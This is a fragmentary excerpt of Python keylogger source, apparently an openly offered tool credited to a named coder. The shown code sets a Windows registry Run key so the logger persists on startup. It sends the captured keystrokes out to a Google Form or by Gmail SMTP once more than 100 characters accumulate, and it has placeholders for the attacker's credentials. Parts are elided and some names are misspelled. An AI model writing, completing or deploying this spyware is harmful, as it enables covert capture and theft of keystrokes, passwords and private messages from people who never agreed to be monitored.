...
def _init_(self):
self._mutex = self.aquire()
def _acquire(self):

#Do not permit Multiple Objects
...
Coder: Alex Shields-Weber <alexshieldsweber@gmail.com>
OPENSECURITY.IN

usage:py_logger.py mode [optional:startup]
...
def addStartup():
    ...
    SetValueEx(key2change, "Py Keylogger",0,REG_SZ, new_file_path)
...
def remote():
    global data
    if len(data)>100:
        url="https://docs.google.com/forms/d/xxxxxxxxxxxxxxxxxxxxxxxxxxxxx" #Specify a Google Form URL here
    ...
    def run(self):
        while not self.event.is_set():
            ...
            if len(data)>100:
                ...
                USER="email@gmail.com" #Specify Username Here 
                PASS="password_here" #Specify Password Here
                FROM = USER #From address is taken from username
                TO = ["to_address@gmail.com"] #Specify to address. Use comma's if more than one to address is needed.
